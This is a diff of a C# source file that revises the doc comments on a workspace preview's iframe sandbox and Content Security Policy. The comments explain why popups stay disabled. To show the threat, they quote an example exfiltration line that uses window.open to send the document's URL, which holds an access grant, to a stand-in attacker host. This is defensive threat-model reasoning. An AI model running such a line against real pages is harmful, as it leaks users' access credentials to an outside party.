@@ -38,19 +38,24 @@ public static class WorkspaceContentTypes
     /// report that cannot run its own chart script or render a form is not a preview of that report;
     /// <c>allow-modals</c> because <c>alert()</c>/<c>confirm()</c> add annoyance, not reach — a document that
     /// already has <c>allow-scripts</c> can spin the CPU regardless, and dropping it silently breaks ordinary
-    /// pages. <c>base-uri 'none'</c> stops the document rewriting its own base URL to somewhere the grant in
-    /// its path would be sent; <c>form-action 'none'</c> pairs with <c>allow-forms</c> so forms render but
-    /// submit nowhere; <c>frame-ancestors 'self'</c> keeps this app the only framer.
+    /// pages. <c>base-uri 'none'</c> stops the document rewriting its own base URL to somewhere its subresource
+    /// requests — and, under the URL transport, the grant in its path — would be sent;
+    /// <c>form-action 'none'</c> pairs with <c>allow-forms</c> so forms render but submit nowhere;
+    /// <c>frame-ancestors 'self'</c> keeps this app the only framer.
     /// </para>
     /// <para>
-    /// <c>allow-popups</c> is ABSENT, and the argument that it is harmless because a popup inherits the
-    /// sandbox misses what is being protected. The document's own URL contains the grant, so
-    /// <c>window.open('https://attacker.example/?g=' + location.pathname)</c> exfiltrates a live read
-    /// credential for this workspace — and a sandboxed popup navigating away is still a navigation, which no
-    /// CSP directive here can stop (<c>navigate-to</c> was removed from CSP3, and <c>default-src</c> governs
-    /// fetches, not top-level navigations). Losing it costs a workspace page its <c>target="_blank"</c>
-    /// links; opening the document full-size stays available as a button this app renders OUTSIDE the frame,
-    /// where no workspace script can reach it.
+    /// <c>allow-popups</c> is ABSENT, and it stays absent because this ONE string has to be safe for the
+    /// WEAKER of the two grant transports. A sandboxed document can navigate itself or a popup anywhere and
+    /// no CSP directive here stops it (<c>navigate-to</c> was removed from CSP3, and <c>default-src</c>
+    /// governs fetches, not top-level navigations) — so whatever is in the document's own URL is
+    /// exfiltrable by <c>window.open('https://attacker.example/?g=' + location.pathname)</c>. On a secure
+    /// context that is now only <c>WorkspaceGrantService.CookieTransportMarker</c>, a public constant: the
+    /// credential is an <c>HttpOnly</c> cookie the document's script cannot read, and a popup inherits the
+    /// sandbox and its opaque origin so it cannot read it either. On the plain-http fallback, where the
+    /// token IS the path segment, the original argument holds unchanged and a live read credential is what
+    /// leaks. Losing the token costs a workspace page its <c>target="_blank"</c> links; opening the document
+    /// full-size stays available as a button this app renders OUTSIDE the frame, where no workspace script
+    /// can reach it.
     /// </para>
     /// </remarks>
     public const string SandboxPolicy =
